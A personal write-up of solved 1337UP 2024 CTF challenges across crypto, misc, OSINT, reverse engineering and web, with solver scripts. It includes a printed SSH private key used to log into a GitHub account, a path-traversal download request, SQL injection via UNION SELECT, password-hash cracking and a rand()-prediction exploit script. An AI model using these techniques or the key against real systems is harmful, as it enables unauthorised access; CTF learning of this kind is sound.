# 

# 1337UP 2024 - Full Writeup

## Intro
Amazing CTF, beginner friendly and is barely guessy, I wish I had more time to solve more challenges, it was super fun.
This writeup contains all the challenges that I solved, Crypto, Misc, Osint, Rev and Web.

## Schrödinger's Pad - Crypto

### Description

Everyone knows you can't reuse a OTP, but throw in a cat and a box.. Maybe it's secure?

nc pad.ctf.intigriti.io 1348

### Explanation

When analyzing the code you'll find out that the flag gets XOR'd with some key, then a bunch of bit operations happen to it depending on the state of our cat.

Nonetheless, we can reverse all these operations : 

```
import random

def reverse_cat_box(ciphertext, cat_state):
    c = bytearray(ciphertext)
    if cat_state == 1:
        for i in range(len(c)):
    
            c[i] ^= 0xAC
 
            c[i] = ((c[i] >> 1) | ((c[i] & 0x01) << 7)) & 0xFF
    else:
        for i in range(len(c)):

            c[i] ^= 0xCA
 
            c[i] = ((c[i] << 1) | (c[i] >> 7)) & 0xFF
    return bytes(c)

def reverse_received_data(c_ciphertext_hex, cat_state):

    c_ciphertext = bytes.fromhex(c_ciphertext_hex)
    

    original_ciphertext = reverse_cat_box(c_ciphertext, cat_state)
    
    print(original_ciphertext.hex())
    


c_ciphertext_hex = "be4ca8a482b2f2a08a44c482acc8f0dea046c4e6cab6b2c88c48b89cf4a4f4b644ba5c46fcdcf8b2dca4e29a48a2ce4ac8a48adef440ace6a4fcec80bec6fc84b6a04ce886b6c85ec0f080da869c46b6be9cbc5e808ef6ce44b08688869c888cdaccfc46b2f0a8dea4defe8044e8de88f8c88e8ebcc0f0e0fcb8c0be48daca46bcc4c44c82f48c5ec4a688a25cc0e28088f4b08aa6f8c0a44248c4f2b2ec8a46"  
cat_state = 1  


reverse_received_data(c_ciphertext_hex, cat_state)
```

I entered a bunch of A's (160 A's to be exact) so as to extract the key cause it's a XOR, then I took the flag the program spat out, reversed it and XOR'd it with the key I found.



## In Plain Sight - Misc

### Description

Barely hidden tbh..

### Explanation

Aperisolve spoiled the password for us, I extracted the hidden zip using foremost, then used the password, then got a png file in which the flag was hidden...in plain sight (superimposed)



## IrrORversible - Misc

### Description

So reversible it's practically irreversible

### Explanation

This one is Fairly simple but guessy, at first I tried to execute cat flag but then I tried just inputting a lots of As, then xored the result with the input and got the flag.

## Layers - Misc

### Description

Weird way to encode your data, but OK! 🤷‍♂️

### Explanation

the files should be sorted based on their modified date : 

```python
import os

def append_text_from_files_by_date(folder_path):
    # List all files in the folder
    files = [
        os.path.join(folder_path, f)
        for f in os.listdir(folder_path)
        if os.path.isfile(os.path.join(folder_path, f))
    ]
    
    # Sort files by last modified time
    files.sort(key=lambda x: os.path.getmtime(x))
    
    # Combine the text from the files
    combined_text = ""
    for file_path in files:
        try:
            with open(file_path, 'r', encoding='utf-8') as file:
                combined_text += file.read()
        except Exception as e:
            print(f"Warning: Could not read file {file_path}. Error: {e}")
    
    return combined_text

folder_path = "./layers/"
combined_text = append_text_from_files_by_date(folder_path)

# Save combined text to a new file
output_file_path = './combined_output.txt'
with open(output_file_path, 'w', encoding='utf-8') as output_file:
    output_file.write(combined_text)

print(f"Combined text has been saved to '{output_file_path}'")

```

## Lost Program - Misc

### Description

I was working on a bug bounty program the other day but I completely forgot the name!! I guess that will teach me not to use emoji notation in future 😩 Anyway, if you could help me find it again, I'd really appreciate it! Here's my notes..

TODO: find lots of 😎🐛 on 🥷🥝🎮

Hint: flag format = INTIGRITI{company_name}

### Explanation

Ninja_Kiwi was the company name. ChatGPT solved this.

## Quick Recovery - Misc

### Description

Hey, check this QR code ASAP! It's highly sensitive so I scrambled it, but you shouldn't have a hard time reconstructing - just make sure to update the a_order to our shared PIN. The b_order is the reverse of that 😉

### Explanation

I didn't even read the code, just used photoshop to piece the puzzle together. This one is a piece of cake

## Triage Bot v2 - Misc

### Description

Check out our new and improved Triage Bot!

https://go.intigriti.com/discord

### Explanation

Same challenge as last year, this time you invite the bot to your server then you assign yourself a triage role, after that you'll call !read_report 0 and you'll get your flag.

## No Comment - Osint

### Description

Or is there? 🤔

### Explanation

The usual, string the file, get the strings, first string is part of an imgur link (guessy), whose title is a base64 text, which leads us to a pastebin url and gives us its password, this pastebin contains a hex, this hex looks like it has been XOR'd, I reuse the same password and I get the flag, and now I'm interested in this cool event, what a psychedelic dream !

## Private Github Repository - Osint

### Description

Bob Robizillo created a public instructions for Tiffany, so she can start work on new secret project. can you access the secret repository?

### Explanation

This is a github/Osint challenge, to solve it I looked up "Bob Robizillo" on google, found a gist github link, the file email.md contained a base64 encoded zip file that when unzipped gave us the id_rsa file :

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
B6k0LmSeJY4/sAAAAGMTMzN3VwAQIDBAU=
-----END OPENSSH PRIVATE KEY-----
```

At first I thought it's something to do with SSH and I had to guess the hostname (assuming the username is tiffany)...No. After I added the key to my ssh list I got this :
```bash
$ ssh-add id_rsa
Identity added: id_rsa (1337up)
$ ssh -T git@github.com
Hi nitrofany! You've successfully authenticated, but GitHub does not provide shell access.
```

Now I am nitrofany, I can access my own repos : 

```bash
$ git pull origin main
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
Unpacking objects: 100% (3/3), 934 bytes | 467.00 KiB/s, done.
From github.com:bob-193/1337up
 * branch            main       -> FETCH_HEAD
 * [new branch]      main       -> origin/main
```

The repo had this file : 

```bash
$ cat readme.md
Hey, Tiffany! You will need to save this repo in your user space and implement changes we agreed earlier.
```

Lots of useful keywords, we'll have to clone 1337up.git then : 

```bash
$ git clone git@github.com:nitrofany/1337up.git
Cloning into '1337up'...
remote: Enumerating objects: 13, done.
remote: Counting objects: 100% (13/13), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 13 (delta 0), reused 10 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (13/13), done.
```

But we're not done yet, there's nothing in this repo : 

```bash
cat config/.env
flag=replace with production INTIGRITI{...}
```

except the keyword production, let's check the logs :

```bash
$ git log --oneline
0f2ad04 (HEAD -> main, origin/main, origin/HEAD) update
5c18888 update
d127325 update
5f73d37 init                       
$ git show 5c18888
commit 5c18888418fd3f2a9d76cfd278b69c1f7c41ba4f
Author: root <root@vmi1519856.contaboserver.net>
Date:   Mon Aug 19 14:15:57 2024 +0200

    update

diff --git a/.gitmodules b/.gitmodules
new file mode 100644
index 0000000..0f2b51c
--- /dev/null
+++ b/.gitmodules
@@ -0,0 +1,3 @@
+[submodule "config"]
+       path = config
+       url = https://github.com/nitrofany/01189998819991197253
diff --git a/flag.txt b/flag.txt
deleted file mode 100644
index e69de29..0000000
$ git clone git@github.com:nitrofany/01189998819991197253
Cloning into '01189998819991197253'...
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (3/3), done.
```

in this repo you can file the flag !


## Socials - Osint

### Description

Have a look around our socials, maybe you'll find some flags! Don't forget to hit follow while you're there 🥺

Flag format: INTIGRITI{Twitter+YouTube+Reddit}

### Explanation

Simple OSINT challenge, I just had to check the comments for twitter, youtube and reddit.

## Bug Squash (Part 1) - Rev

### Description

Squash those bugs!

### Explanation

Use the powerful tool that is AssetRipper, I've added all the files, then exported the project, then ran strings and searched for anything that mentions win.enc, why ? Because in "StreamingAssets" there's a folder called MeshText containing this file, my instincts said that's the flag.

In GameManager.cs there's this function : 

```C#
private void CheckWinCondition()
	{
		if (score != -1337)
		{
			return;
		}
		iv = SetIV();
		byte[] array = LoadKeyfile(winfilePath);
		if (array != null)
		{
			byte[] array2 = DecryptImageFromFile(winImagePath, array);
			if (array2 != null)
			{
				DisplayWinImage(array2);
			}
			else
			{
				Debug.LogError("Failed to decrypt the image.");
			}
		}
		else
		{
			Debug.LogError("Failed to load the keyfile.");
		}
	}
```

Round 2 : Cheat Engine. We'll simply look for the score value, change it to -1338, catch a bug (+1), and voila : 

![alt text]({CD566D71-F20C-4E7B-9325-32832D3E519F}.png)

## Cold Storage - Rev

### Description

People say you should store your keys offline in cold storage, so I built this offline app! I think that's what cold storage means 🤔

### Explanation

I started by using Jadx to get the source code, then I found an obfuscated javascript code, then deobfuscated it : 

```javascript
function affineEncrypt(_0x1930bc, _0x36e79b, _0x33477e) {
  return (_0x36e79b * _0x1930bc + _0x33477e) % 0x100;
}
function xor(_0x3a38fa, _0x3c3309) {
  return _0x3a38fa ^ _0x3c3309;
}
function hexToBytes(_0x1d9eb0) {
  let _0x2ac99a = [];
  for (let _0x2363dc = 0x0; _0x2363dc < _0x1d9eb0.length; _0x2363dc += 0x2) {
    _0x2ac99a.push(parseInt(_0x1d9eb0.substr(_0x2363dc, 0x2), 0x10));
  }
  return _0x2ac99a;
}
function reverseString(_0x22dcba) {
  return _0x22dcba.split('').reverse().join('');
}
function keygen() {
  let _0x19eb60 = ["9425749445e494332757363353f5d6f50353b79445d7336343270373270366f586365753f546c60336f5".slice(0x0, 0xe), "9425749445e494332757363353f5d6f50353b79445d7336343270373270366f586365753f546c60336f5".slice(0xe, 0x1c), "9425749445e494332757363353f5d6f50353b79445d7336343270373270366f586365753f546c60336f5".slice(0x1c, 0x2a), "9425749445e494332757363353f5d6f50353b79445d7336343270373270366f586365753f546c60336f5".slice(0x2a, 0x38), "9425749445e494332757363353f5d6f50353b79445d7336343270373270366f586365753f546c60336f5".slice(0x38, 0x46), "9425749445e494332757363353f5d6f50353b79445d7336343270373270366f586365753f546c60336f5".slice(0x46, 0x54)];
  let _0x4c2f5e = [_0x19eb60[0x3], _0x19eb60[0x5], _0x19eb60[0x1], _0x19eb60[0x4], _0x19eb60[0x2], _0x19eb60[0x0]];
  let _0x22e526 = _0x4c2f5e.join('').split('').reverse().join('');
  let _0x2051e9 = hexToBytes(_0x22e526);
  let _0x351569 = _0x2051e9.map(_0x585a6f => (0x9 * _0x585a6f + 0x7) % 0x100 ^ 0x33);
  return _0x351569.map(_0x5ca89b => ('0' + _0x5ca89b.toString(0x10)).slice(-0x2)).join('');
}
```

So I console.logged _0x2051e9 because after that line some xor and math happens and I got the flag !


## Phish Market Order Management - Rev

### Description

Welcome to the Phish Market Order Management System! This system will allow you to view important information about the Phish Market's products and customers.

### Explanation

First step was to gain the admin password : 

![alt text]({4D34A957-D953-4486-8D25-5E6B98F3E03F}.png)

the condition checks if sub_40359c returns false : 

![alt text]({908D4712-B1BD-4355-82F6-3514E28307DC}.png)

and this function calls sub_4034c9 : 

![alt text]({7C9544D8-2BC1-41EA-9E85-53B09D18D759}.png)

which I assumed encrypts the string INTRIGITI1337UP# with a xor key, however I was missing the key...

Good thing is retdec exposes the key :

![alt text]({217F2C55-5208-450F-B108-297B31F4CAF7}.png)

the password was "N3v3RG0nn@6u3$$!"

I couldn't simply cat the flag because my input was part of a sql query, except this query was vulnerable to SQLi : 

![alt text]({892C9212-D4DB-4E6F-83E5-A369476108C2}.png)

it should be like this : 

![alt text]({98965223-D944-419C-ADC9-A2FBA97A75F4}.png)

With a quote added to the end, so I ran a union select query BUT the results were being converted to decimal, so what I did was to take just 1 character off the flag, convert it to decimal, then display it : 

![alt text]({3D3F4305-AACD-4F7C-BAF0-CAC79EE201A0}.png)

## Rigged Slot Machine 1 - Rev

### Description

The casino thinks they've rigged their slots so well, they can give every player $100 free play! Of course, there's always some small print: you can't cash out unless you hit the jackpot and each player only gets 3 minutes play time

### Explanation

If we reverse the binary we'll find that we'll have to reach a balance of 133742 dollars...Good thing is the outcome is determined by rand() which uses the current time as a seed.

I made a quick program in c that generates a hashmap of 10k elements, 1 for win and 0 for loss : 

```C
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

// Define the size of the "hashmap"
#define NUM_RANDOMS 100000

// Array to store pre-generated random numbers
int random_numbers[NUM_RANDOMS];
// Array to store outcome map
int outcome_map[NUM_RANDOMS];

// Function to analyze the outcome based on random value
void analyze_outcome(int rand_val, int index) {
    
    if (rand_val == 0) {
        outcome_map[index] = 1; // Win
    }
    else if (rand_val < 10) {
        outcome_map[index] = 1; // Win
    }
    else if (rand_val < 15) {
        outcome_map[index] = 1; // Win
    }
    else if (rand_val < 20) {
        outcome_map[index] = 1; // Win
    }
    else if (rand_val < 30) {
        outcome_map[index] = 1; // Break-even counts as Win
    }
    else {
        outcome_map[index] = 0; // Loss
    }
    printf("%d ", outcome_map[index]);


}

int main() {
    char input;
    int index = 0;

    // Seed random number generator
    srand(time(NULL));

    // Generate and store random numbers in the array
    for (int i = 0; i < NUM_RANDOMS; i++) {
        analyze_outcome(rand() % 100, i);
    }

    return 0;
}
```

Could've improved the code but whatever...

Then here's the pwntools script for automating the bets : 

```python
from pwn import *

# Connect to the predictor process

#print(stringlist_list)

# Start the second process
#p = process('./rigged_slot1')
p = remote('riggedslot1.ctf.intigriti.io', 1332)
r = process('./predictor')

# Receive all data from the process
stringlist = r.recvall()

# Decode the bytes object to a string
decoded_stringlist = stringlist.decode('utf-8')

# Convert the string to a list by splitting on spaces
stringlist_list = decoded_stringlist.split(' ')
response = b'100'

for n in stringlist_list:
    # Send the number to the process
    if int(response) > 100:
        response = b'100'
    if n == '1':
        p.sendline(response)
        print("Sent: 100")
        # Receive the response from the process
    else:
        p.sendline(b'1')
        print("Sent: 1")
        # Receive the response from the process
    response = p.recvline_startswith(b'Current Balance: ')
    response = response.split(b'$')[1]
    print("balance : ",int(response))
    if int(response) >= 133742:
        break

print(p.recvall())
```

## Secure Bank - Rev

### Description

Can you crack the bank?

nc securebank.ctf.intigriti.io 1335

### Explanation



First key was 1337, easily found by decompiling the binary.

For the second key. It felt easier to just run gdb and look at what the input is being compared with.

![alt text]({EE41CC82-684F-4217-8356-394EDD37A09E}.png)



## TriForce Recon - Rev

### Description

you have intercepted a classified message that has been divided into three encrypted executables and were each hidden on different operating systems.

Flag format: INTGRITI{Flag1+Flag2+Flag3}

### Explanation

We get the first part by reversing the program's algorithm : 

```python
def xor_decrypt(encrypted: bytearray, key: str) -> str:
    
    decrypted = bytearray(len(encrypted))
    key_length = len(key)
    for i in range(len(encrypted)):
        decrypted[i] = encrypted[i] ^ ord(key[i % key_length])
    return decrypted.decode('utf-8')

def hex_to_string(hex_str: str) -> bytearray:
    
    byte_array = bytearray()
    for i in range(0, len(hex_str), 2):
        byte_array.append(int(hex_str[i:i+2], 16))
    return byte_array


hex_string = "7e54595f09434b0f4a5d59757b514a5b6d550d0f0c765b7d45"
key = "8" 


encrypted_data = hex_to_string(hex_string)


flag = xor_decrypt(encrypted_data, key)
print("Correct flag:", flag)
```

Flag1{s7reaMCircUm574NcE}

We can aquire the second part by running Courage.out, it's an ELF.

Same code as part1 : hex string is 775a5051034d5644706002635f467d0570030558454b and key is 16



Flag2{grAV3UnpL3A54nt}

Third part is the exact same code again just change the hex string to 755e525500496177065b057c076602025d6152467a0755735046025d5d4f and the key to 32.

Flag3{RE5i6N4T10nSatI5fAct1on}




## Pizza Paradise - Web

### Description

Something weird going on at this pizza store!!

### Explanation

First things first let's check if the site has robots.txt : 

```html
User-agent: *
Disallow: /secret_172346606e1d24062e891d537e917a90.html
Disallow: /assets/
```

Yep, let's head to this url : 

![alt text]({215BA182-CBCE-4F41-BB86-26EA46CE777D}.png)

Woah government files ??? 


```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>Top Secret Government Access</title>
        <link
            href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap"
            rel="stylesheet"
        />
        <link rel="stylesheet" href="/assets/css/secret-theme.css" />
        <script src="/assets/js/auth.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
        <script>
            function hashPassword(password) {
                return CryptoJS.SHA256(password).toString();
            }

            function validate() {
                const username = document.getElementById("username").value;
                const password = document.getElementById("password").value;

                const credentials = getCredentials();
                const passwordHash = hashPassword(password);

                if (
                    username === credentials.username &&
                    passwordHash === credentials.passwordHash
                ) {
                    return true;
                } else {
                    alert("Invalid credentials!");
                    return false;
                }
            }
        </script>
    </head>
    <body>
        <div class="container">
            <h1>Top Secret Government Access</h1>
            <form id="loginForm" action="login.php" method="POST" onsubmit="return validate();">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required /><br />
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required /><br />
                <input type="submit" value="Login" />
            </form>
        </div>
    </body>
</html>
```

Interesting, let's check the js file : 

```javascript
const validUsername = "agent_1337";
const validPasswordHash = "91a915b6bdcfb47045859288a9e2bd651af246f07a083f11958550056bed8eac";

function getCredentials() {
    return {
        username: validUsername,
        passwordHash: validPasswordHash,
    };
}
```
An easily crackable password hash, thank God : 
![alt text]({80CE55E5-0F2C-4105-A917-46671A1DD347}.png) 

and we're in : 

![alt text]({595CD701-8739-4B77-BB9F-62DFFDE0ACC7}.png)

For now we can only download a handful of files, but we can do a little trick :

```bash
GET /topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download=/assets/images/../../topsecret_a9aedc6c39f654e55275ad8e65e316b3.php
```

Voila : 

```php
HTTP/2 200 OK
Date: Sat, 16 Nov 2024 13:49:46 GMT
Content-Type: application/octet-stream
Content-Length: 1819
Server: istio-envoy
X-Powered-By: PHP/8.3.13
Content-Disposition: attachment; filename="topsecret_a9aedc6c39f654e55275ad8e65e316b3.php"
X-Envoy-Upstream-Service-Time: 1

<?php

$flag = 'INTIGRITI{70p_53cr37_m15510n_c0mpl373}';

if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (strpos($file, '/assets/images/') === 0) {
        $filePath = __DIR__ . '/' . $file;
        if (file_exists($filePath)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
            header('Content-Length: ' . filesize($filePath));
            readfile($filePath);
            exit();
        } else {
            die('File not found!');
        }
    } else {
        die('File path not allowed!');
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Top Secret Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/assets/css/secret-theme.css">
    <script src="/assets/js/displayImage.js"></script>
</head>
<body>
    <div class="container">
        <h1>Welcome to the Top Secret Government Portal</h1>
        <p>Authorized personnel only.</p>

        <img id="selectedImage" src="/assets/images/topsecret1.png" alt="Selected Image">

        <form method="GET" action="">
            <label for="image">Select Image to Download:</label>
            <select name="download" id="image" onchange="updateImage()">
                <option value="/assets/images/topsecret1.png">Image 1</option>
                <option value="/assets/images/topsecret2.png">Image 2</option>
                <option value="/assets/images/topsecret3.png">Image 3</option>
                <option value="/assets/images/topsecret4.png">Image 4</option>
            </select>
            <button type="submit">Download</button>
        </form>
    </div>
</body>
</html>
```




